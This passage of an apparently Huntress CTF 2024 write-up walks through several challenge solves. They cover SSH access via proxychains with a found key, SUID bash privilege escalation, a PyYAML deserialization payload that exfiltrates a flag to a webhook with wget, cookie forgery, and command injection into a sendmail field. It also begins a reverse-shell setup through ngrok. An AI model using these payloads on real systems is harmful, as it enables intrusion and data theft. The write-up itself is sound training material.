</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="p">:</span> <span class="n">Accept</span><span class="p">::</span> <span class="n">command</span> <span class="ow">not</span> <span class="n">found</span>
</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">4.4</span><span class="o">$</span> 
</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Visiting the page looks to return a file directory, conveniently enough located at root <code>/</code> so we can see the entire filesystem. After navigating through <code>home</code>, we eventually land on an interesting file:</p>
<p><img src="/post/huntress-ctf-2024/Images/id_rsa.png"
	width="659"
	height="669"
	srcset="/post/huntress-ctf-2024/Images/id_rsa_hu11133313609042369789.png 480w, /post/huntress-ctf-2024/Images/id_rsa_hu14012204286249214569.png 1024w"
	loading="lazy"
	
		alt="Viewing id_rsa key"
	
	
		class="gallery-image" 
		data-flex-grow="98"
		data-flex-basis="236px"
	
>]</p>
<p>Small note: to view in browser I set up a <code>FoxyProxy</code> entry:
<img src="/post/huntress-ctf-2024/Images/foxyproxy.png"
	width="1161"
	height="205"
	srcset="/post/huntress-ctf-2024/Images/foxyproxy_hu7494441092006231806.png 480w, /post/huntress-ctf-2024/Images/foxyproxy_hu4261183882477489318.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="566"
		data-flex-basis="1359px"
	
></p>
<p>Now we have an SSH key to authenticate. There may be a better way, but for ssh proxying I used <code>proxychains</code>. Setting up proxychains.conf:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/huntressctf]
</span></span><span class="line"><span class="cl">└─$ tail /etc/proxychains4.conf 
</span></span><span class="line"><span class="cl">#        ( auth types supported: &#34;basic&#34;-http  &#34;user/pass&#34;-socks )
</span></span><span class="line"><span class="cl">#
</span></span><span class="line"><span class="cl">[ProxyList]
</span></span><span class="line"><span class="cl"># add proxy here ...
</span></span><span class="line"><span class="cl"># meanwile
</span></span><span class="line"><span class="cl"># defaults set to &#34;tor&#34;
</span></span><span class="line"><span class="cl"># socks4        127.0.0.1 9050
</span></span><span class="line"><span class="cl">http  35.193.148.143 32614
</span></span></code></pre></td></tr></table>
</div>
</div><p>This IPV4 was identified from the previous curl command.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">* Connected to challenge.ctf.games (35.193.148.143) port 32614
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/huntressctf]
</span></span><span class="line"><span class="cl">└─$ proxychains -q ssh user@127.0.0.1 -i id_rsa
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">-bash-4.4$ ls
</span></span><span class="line"><span class="cl">-bash-4.4$ ls -al
</span></span><span class="line"><span class="cl">total 20
</span></span><span class="line"><span class="cl">drwxr-xr-x 1 root root 4096 Oct  7 18:29 .
</span></span><span class="line"><span class="cl">drwxr-xr-x 1 root root 4096 Oct  7 18:29 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 user user 3865 Oct  7 18:29 .bashrc
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 user user   17 Oct  7 18:29 .profile
</span></span><span class="line"><span class="cl">drwxr-xr-x 1 user user 4096 Oct  7 18:29 .ssh
</span></span><span class="line"><span class="cl">-bash-4.4$
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we have access, but as per the prompt, the flag is located in /root.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-bash-4.4$ cd /
</span></span><span class="line"><span class="cl">-bash-4.4$ cd root
</span></span><span class="line"><span class="cl">-bash: cd: root: Permission denied
</span></span></code></pre></td></tr></table>
</div>
</div><p>Of course, no access. Now I just decide to rip linpeas, but the privilege escalation is a pretty simple one to find on your own as well.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">-</span><span class="n">bash</span><span class="o">-</span><span class="mf">4.4</span><span class="o">$</span> <span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">peass</span><span class="o">-</span><span class="n">ng</span><span class="o">/</span><span class="n">PEASS</span><span class="o">-</span><span class="n">ng</span><span class="o">/</span><span class="n">releases</span><span class="o">/</span><span class="n">latest</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="n">linpeas</span><span class="o">.</span><span class="n">sh</span>     
</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">29</span> <span class="mi">23</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">59</span><span class="o">--</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">peass</span><span class="o">-</span><span class="n">ng</span><span class="o">/</span><span class="n">PEASS</span><span class="o">-</span><span class="n">ng</span><span class="o">/</span><span class="n">releases</span><span class="o">/</span><span class="n">latest</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="n">linpeas</span><span class="o">.</span><span class="n">sh</span>
</span></span><span class="line"><span class="cl"><span class="n">Resolving</span> <span class="n">github</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="p">)</span><span class="o">...</span> <span class="mf">140.82</span><span class="o">.</span><span class="mf">113.3</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">bash</span><span class="o">-</span><span class="mf">4.4</span><span class="o">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">linpeas</span><span class="o">.</span><span class="n">sh</span> 
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">bash</span><span class="o">-</span><span class="mf">4.4</span><span class="o">$</span> <span class="o">./</span><span class="n">linpeas</span><span class="o">.</span><span class="n">sh</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
</span></span><span class="line"><span class="cl"><span class="err">══════════════════════╣</span> <span class="n">Files</span> <span class="n">with</span> <span class="n">Interesting</span> <span class="n">Permissions</span> <span class="err">╠══════════════════════</span>                                                                                                                   
</span></span><span class="line"><span class="cl">                      <span class="err">╚════════════════════════════════════╝</span>                                                                                                                                         
</span></span><span class="line"><span class="cl"><span class="err">╔══════════╣</span> <span class="n">SUID</span> <span class="o">-</span> <span class="n">Check</span> <span class="n">easy</span> <span class="n">privesc</span><span class="p">,</span> <span class="n">exploits</span> <span class="ow">and</span> <span class="n">write</span> <span class="n">perms</span>
</span></span><span class="line"><span class="cl"><span class="err">╚</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">book</span><span class="o">.</span><span class="n">hacktricks</span><span class="o">.</span><span class="n">xyz</span><span class="o">/</span><span class="n">linux</span><span class="o">-</span><span class="n">hardening</span><span class="o">/</span><span class="n">privilege</span><span class="o">-</span><span class="n">escalation</span><span class="c1">#sudo-and-suid &lt;...SNIP...&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">sr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">1.1</span><span class="n">M</span> <span class="n">Apr</span> <span class="mi">18</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Here is bash, with SUID privileges as root. Exploiting:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-bash-4.4$ bash -p
</span></span><span class="line"><span class="cl">bash-4.4# id
</span></span><span class="line"><span class="cl">uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we can get the flag!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bash-4.4# cd /root
</span></span><span class="line"><span class="cl">bash-4.4# cat flag.txt 
</span></span><span class="line"><span class="cl">flag{c9bbd4888086111e9f632d4861c103f1}
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h2 id="web">Web
</h2><h3 id="y2j">Y2J
</h3><blockquote>
<p>Everyone was so worried about Y2K, but apparently <em>it was a typo all along</em>!!<br>
The real world-ending fears were from <strong>Y2J</strong>!
Find the flag.txt file in the root of the filesystem.</p>
<p>Author: JohnHammond#6971</p>
</blockquote>
<p>There is no source code provided, so we must go in blind. On entering, there is only 1 page: a YAML to JSON converter:</p>
<p><img src="/post/huntress-ctf-2024/Images/Y2K_LandingPage.png"
	width="1228"
	height="534"
	srcset="/post/huntress-ctf-2024/Images/Y2K_LandingPage_hu139568325705330463.png 480w, /post/huntress-ctf-2024/Images/Y2K_LandingPage_hu8710000645664978559.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="229"
		data-flex-basis="551px"
	
></p>
<p>If we take a look at the response headers, we can see it is python based:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ chttp://challenge.ctf.games:30167/:30167/  
</span></span><span class="line"><span class="cl">HTTP/1.1 200 OK  
</span></span><span class="line"><span class="cl">Server: Werkzeug/3.0.3 Python/3.12.7  
</span></span><span class="line"><span class="cl">Date: Sat, 02 Nov 2024 04:19:40 GMT  
</span></span><span class="line"><span class="cl">Content-Type: text/html; charset=utf-8  
</span></span><span class="line"><span class="cl">Content-Length: 2532  
</span></span><span class="line"><span class="cl">Connection: close
</span></span></code></pre></td></tr></table>
</div>
</div><p>After a quick google search we might begin to suspect that this could be related to PyYAML deserialization attacks. There is a <a class="link" href="https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization"  target="_blank" rel="noopener"
    >HackTricks page</a> that covers the basics of this. As a test, I used a sleep command:
<img src="/post/huntress-ctf-2024/Images/Y2K_Sleep.png"
	width="1219"
	height="577"
	srcset="/post/huntress-ctf-2024/Images/Y2K_Sleep_hu6029690378572158313.png 480w, /post/huntress-ctf-2024/Images/Y2K_Sleep_hu16363069145923903063.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="211"
		data-flex-basis="507px"
	
>
(trust me bro the sleep happened)</p>
<p>Also it&rsquo;s worth noting that there wasn&rsquo;t an error message here, so I have pretty high confidence that remote execution is possible here and we can use this approach to get the flag. There is a flag read example on HackTricks, but unfortunately I was getting attribute errors:</p>
<p><img src="/post/huntress-ctf-2024/Images/Y2K_Error.png"
	width="1227"
	height="562"
	srcset="/post/huntress-ctf-2024/Images/Y2K_Error_hu3778777644076619642.png 480w, /post/huntress-ctf-2024/Images/Y2K_Error_hu2194257233409258562.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="523px"
	
></p>
<p>Eventually I found a very small and simple payload at the <a class="link" href="https://github.com/wallarm/fast-detects/blob/master/pyyaml-deserialization.yaml"  target="_blank" rel="noopener"
    >gihub repository from wallarm</a>. After some small modifications, I got the service to reach out to my webhook.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!python/object/new:exec [import os; os.system(&#39;wget https://webhook.site/115e8884-91f4-4d29-8d48-3f58a50fbba4/&#39;)]
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/post/huntress-ctf-2024/Images/Y2K_Webhook1.png"
	width="802"
	height="295"
	srcset="/post/huntress-ctf-2024/Images/Y2K_Webhook1_hu6692595065525851385.png 480w, /post/huntress-ctf-2024/Images/Y2K_Webhook1_hu6883856375675312322.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="652px"
	
></p>
<p>Small note: for simple CTF deployment instances I find that <code>curl</code> is not always present, but usually <code>wget</code> will be. So even though I&rsquo;m not using this to download anything, i know i can communicate from the server without having to mess with a full-blown reverse shell.</p>
<p>From here I can just append a <code>cat /flag.txt</code> command, and the output gets sent to the webhook</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!python/object/new:exec [import os; os.system(&#39;wget https://webhook.site/115e8884-91f4-4d29-8d48-3f58a50fbba4/`cat /flag.txt`&#39;)]
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/post/huntress-ctf-2024/Images/Y2K_Webhook2.png"
	width="779"
	height="271"
	srcset="/post/huntress-ctf-2024/Images/Y2K_Webhook2_hu7009604091985275219.png 480w, /post/huntress-ctf-2024/Images/Y2K_Webhook2_hu13930560940100334823.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="287"
		data-flex-basis="689px"
	
></p>
<p><code>flag{b20870a1955ac22377045e3b2dcb832a}</code></p>
<hr>
<h3 id="plantopia">Plantopia
</h3><blockquote>
<p>Plantopia is our brand new, cutting edge plant care management website! Built for hobbiests and professionals alike, it&rsquo;s your one stop shop for all plant care management.<br>
Please perform a penetration test ahead of our site launch and let us know if you find anything.
Username: <code>testuser</code>
Password: <code>testpassword</code></p>
<p>Author: @HuskyHacks</p>
</blockquote>
<p>After logging in, we have a dashboard that is not very interactive:</p>
<p><img src="/post/huntress-ctf-2024/Images/Plantopia_LandingPage.png"
	width="1151"
	height="709"
	srcset="/post/huntress-ctf-2024/Images/Plantopia_LandingPage_hu14353789737829852477.png 480w, /post/huntress-ctf-2024/Images/Plantopia_LandingPage_hu8927280474716412456.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="162"
		data-flex-basis="389px"
	
></p>
<p>Not very interesting. It seems the way to interact here is through API, so we go to the API Docs page. We can try to authorize, and they give us interesting information:</p>
<p><img src="/post/huntress-ctf-2024/Images/Plantopia_Authorize.png"
	width="658"
	height="361"
	srcset="/post/huntress-ctf-2024/Images/Plantopia_Authorize_hu16234309722674031888.png 480w, /post/huntress-ctf-2024/Images/Plantopia_Authorize_hu11485524526678882870.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="182"
		data-flex-basis="437px"
	
></p>
<p>Straight up they tell us how we can forge a token. We can take a look at our legitimate token by viewing the cookies. In firefox, you can right click -&gt; Inspect (or ctrl+shift+I) to open up devtools, then navigate to storage:</p>
<p><img src="/post/huntress-ctf-2024/Images/Plantopia_Cookie.png"
	width="1015"
	height="248"
	srcset="/post/huntress-ctf-2024/Images/Plantopia_Cookie_hu13852298864983775142.png 480w, /post/huntress-ctf-2024/Images/Plantopia_Cookie_hu10829805932577420057.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="409"
		data-flex-basis="982px"
	
></p>
<p>Decode in command line:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ echo &#34;dGVzdHVzZXIuMC4xNzMwNTI2MDg0&#34; | base64 -d  
</span></span><span class="line"><span class="cl">testuser.0.1730526084
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looks like admin is expecting <code>testuser.1</code> so we can just base64 encode the new cookie the same way:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ echo &#34;testuser.1.1730526084&#34; | base64
</span></span><span class="line"><span class="cl">dGVzdHVzZXIuMS4xNzMwNTI2MDg0Cg==
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we can check with the <code>/api/admin/settings</code>:</p>
<p><img src="/post/huntress-ctf-2024/Images/Plantopia_SettingsSetup.png"
	width="879"
	height="611"
	srcset="/post/huntress-ctf-2024/Images/Plantopia_SettingsSetup_hu13782322258832049693.png 480w, /post/huntress-ctf-2024/Images/Plantopia_SettingsSetup_hu8226961869983416409.png 1024w"
	loading="lazy"
	
		alt="The configuration"
	
	
		class="gallery-image" 
		data-flex-grow="143"
		data-flex-basis="345px"
	
></p>
<p><img src="/post/huntress-ctf-2024/Images/Plantopia_SettingsResponse.png"
	width="1100"
	height="792"
	srcset="/post/huntress-ctf-2024/Images/Plantopia_SettingsResponse_hu1980570974538624976.png 480w, /post/huntress-ctf-2024/Images/Plantopia_SettingsResponse_hu11635263431527022558.png 1024w"
	loading="lazy"
	
		alt="The response"
	
	
		class="gallery-image" 
		data-flex-grow="138"
		data-flex-basis="333px"
	
></p>
<p>Now we have it working as Admin. This request is also interesting because the &ldquo;alert_command&rdquo; key seems to be accepting shell command format. Potentially we can insert our own command here to run. If we remove sendmail we get the following error:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Alert command must include &#39;/usr/sbin/sendmail&#39;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Potentially we can append an additional command though?</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;plant_id&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;alert_command&#34;</span><span class="p">:</span> <span class="s2">&#34;/usr/sbin/sendmail -t &amp;&amp; sleep 5&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;watering_threshold&#34;</span><span class="p">:</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This submission is accepted, but in this API we are only setting up the execution not actually running. To execute, we can go to the <code>/api/admin/sendmail</code></p>
<p><img src="/post/huntress-ctf-2024/Images/Plantopia_Sendmail1.png"
	width="1437"
	height="736"
	srcset="/post/huntress-ctf-2024/Images/Plantopia_Sendmail1_hu17243781377958520895.png 480w, /post/huntress-ctf-2024/Images/Plantopia_Sendmail1_hu5171613701995730150.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="195"
		data-flex-basis="468px"
	
>
(Trust me bro it hung for 5 seconds because of the sleep)</p>
<p>Now that it&rsquo;s looking like the RCE is possible this way, time to return back to my trusty webhook:</p>
<p><img src="/post/huntress-ctf-2024/Images/Plantopia_Webhook.png"
	width="314"
	height="228"
	srcset="/post/huntress-ctf-2024/Images/Plantopia_Webhook_hu12317097583937344179.png 480w, /post/huntress-ctf-2024/Images/Plantopia_Webhook_hu807346031599205902.png 1024w"
	loading="lazy"
	
		alt="(It never sends.)"
	
	
		class="gallery-image" 
		data-flex-grow="137"
		data-flex-basis="330px"
	
></p>
<p>The sleep is working clearly, but unfortunately for us it seems both <code>curl</code> and <code>wget</code> don&rsquo;t exist. I solved this using <code>ngrok</code> first, but in a second review I think an easier, slightly cheekier method is to write over an image.</p>
<h4 id="solve-method-overwrite-an-image">Solve method: overwrite an image
</h4><p>Python web servers rely on routing, so we can&rsquo;t exactly visit any file that exists in folders as we could with other web services. However, if there is sufficient write privileges, we can overwrite files. Most important files (such as <code>app.py</code>) are likely write protected, but objects in the static folders sometimes are not. In this case we can use it to receive RCE output!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;plant_id&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;alert_command&#34;</span><span class="p">:</span> <span class="s2">&#34;/usr/sbin/sendmail -t &amp;&amp; ls -al &gt; static/images/aloe.jpg&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;watering_threshold&#34;</span><span class="p">:</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we visit in browser, it will try to be loaded as an image due to the application-type, and it fails. However we can still curl:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl http://challenge.ctf.games:30706/static/images/aloe.jpeg  
</span></span><span class="line"><span class="cl">total 88  
</span></span><span class="line"><span class="cl">drwxr-xr-x 1 root root  4096 Nov  2 04:40 .  
</span></span><span class="line"><span class="cl">drwxr-xr-x 1 root root  4096 Sep 30 07:09 ..  
</span></span><span class="line"><span class="cl">drwxr-xr-x 2 root root  4096 Nov  2 04:40 __pycache__  
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root   647 Sep 30 07:09 admin_utils.py  
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root  6471 Sep 30 07:09 api.py  
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root 10452 Sep 30 07:09 app.py  
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root    39 Sep 30 07:09 flag.txt  
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root  3618 Sep 30 07:09 models.py  
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root    38 Sep 30 07:09 requirements.txt  
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root 15425 Nov  2 05:07 server.log  
</span></span><span class="line"><span class="cl">drwxr-xr-x 1 root root  4096 Sep 30 07:09 static  
</span></span><span class="line"><span class="cl">drwxr-xr-x 2 root root  4096 Sep 30 07:09 templates  
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root  2368 Sep 30 07:09 utils.py
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we know it works, and also that <code>flag.txt</code> is in the pwd.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;plant_id&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;alert_command&#34;</span><span class="p">:</span> <span class="s2">&#34;/usr/sbin/sendmail -t &amp;&amp; cat flag.txt &gt; static/images/aloe.jpg&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;watering_threshold&#34;</span><span class="p">:</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Retrieving the flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl http://challenge.ctf.games:30706/static/images/aloe.jpeg  
</span></span><span class="line"><span class="cl">flag{c29c4d53fc432f7caeb573a9f6eae6c6}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="solve-method-reverse-shell-via-ngrok">Solve method: Reverse shell via ngrok
</h4><p>Reverse shells are very powerful, and since my go-to method of <code>wget</code> on a webhook wasn&rsquo;t working out I also want to verify if wget doesn&rsquo;t exist.</p>
<p>An <a class="link" href="https://ngrok.com/"  target="_blank" rel="noopener"
    >ngrok account</a> must be created and a token assigned, but once the hard work is done the command line is really simple:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/huntressctf]
</span></span><span class="line"><span class="cl">└─$ ngrok tcp 8080 
</span></span></code></pre></td></tr></table>
</div>
</div><p>While running it gives a small interface with details and will list some connection information when they occur.</p>
<p><img src="/post/huntress-ctf-2024/Images/ngrok.png"
	width="812"
	height="309"
	srcset="/post/huntress-ctf-2024/Images/ngrok_hu6103784177425177295.png 480w, /post/huntress-ctf-2024/Images/ngrok_hu18252149179846104510.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="262"
		data-flex-basis="630px"
	
></p>
<p>From <a class="link" href="https://www.revshells.com/"  target="_blank" rel="noopener"
    >revshells</a>, we can grab a simple bash 1liner:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
